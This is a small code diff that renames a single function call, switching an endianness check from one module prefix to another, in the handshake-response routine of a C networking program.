@@ -83,7 +83,7 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
 
     /* queue response */
     laikaS_startOutPacket(peer, LAIKAPKT_HANDSHAKE_RES);
-    laikaS_writeByte(&peer->sock, laikaS_isBigEndian());
+    laikaS_writeByte(&peer->sock, laikaM_isBigEndian());
     laikaS_write(&peer->sock, peer->salt, LAIKA_HANDSHAKE_SALT_LEN);
     laikaS_endOutPacket(peer);
 
